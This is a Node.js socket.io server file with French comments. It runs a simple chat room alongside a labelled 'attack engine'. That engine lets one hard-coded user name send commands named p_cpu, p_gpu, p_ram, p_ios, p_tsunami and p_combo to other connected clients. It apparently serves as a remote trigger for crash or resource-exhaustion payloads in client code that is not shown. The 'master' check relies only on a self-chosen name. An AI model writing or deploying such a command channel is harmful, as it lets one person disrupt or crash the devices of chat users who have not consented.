const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// On sert les fichiers directement depuis la racine
app.use(express.static(__dirname));

let users = [];

io.on('connection', (socket) => {
    // Initialisation
    socket.on('init', (data) => {
        const newUser = { id: socket.id, name: data.name || "Stand_User" };
        users.push(newUser);
        io.emit('sync', users);
        console.log(`[JOIN] ${newUser.name}`);
    });

    // Chat
    socket.on('chat', (msg) => {
        const user = users.find(u => u.id === socket.id);
        if (user) io.emit('chat', { n: user.name, t: msg });
    });

    // MOTEUR D'ATTAQUE [THE WORLD]
    const attacks = ['p_combo', 'p_tsunami', 'p_cpu', 'p_gpu', 'p_ios', 'p_ram'];
    attacks.forEach(type => {
        socket.on(type, (targetId) => {
            const boss = users.find(u => u.id === socket.id);
            // Sécurité Master
            if (boss && boss.name === "toucheur2pp") {
                io.to(targetId).emit('execute', { type: type });
            }
        });
    });

    socket.on('disconnect', () => {
        users = users.filter(u => u.id !== socket.id);
        io.emit('sync', users);
    });
});

// Route principale
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Port adaptatif pour Render
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🥊 PUNCH V95 ACTIVE SUR PORT ${PORT}`);
});
